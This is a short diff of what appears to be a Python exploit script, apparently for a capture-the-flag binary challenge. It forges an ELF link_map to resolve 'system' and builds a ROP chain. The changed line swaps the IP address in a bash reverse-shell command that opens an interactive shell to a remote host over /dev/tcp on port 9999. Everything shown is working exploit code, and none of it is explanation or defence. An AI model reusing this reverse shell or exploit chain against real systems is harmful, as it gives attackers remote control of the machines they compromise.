@@ -53,7 +53,7 @@ link_map_add=0x601a00
 link_map_f=build_link_map_x64(elf,libc,link_map_add,"system","close")
 link_map=fit(link_map_f,filler="a").replace("a","")
 
-cmd="bash -c \"bash -i >& /dev/tcp/47.75.10.138/9999 0>&1\""
+cmd="bash -c \"bash -i >& /dev/tcp/1.1.1.1/9999 0>&1\""
 cmd_addr=link_map_add+0x98
 link_map_rop=[
     p64(0x4006FB)+p64(link_map_add+0x68+0x1c)+p64(0x400673)+p64(0x1)+p64(link_map_add+0x68+0x20)+p64(0x40067A),# write 0x68-0x98
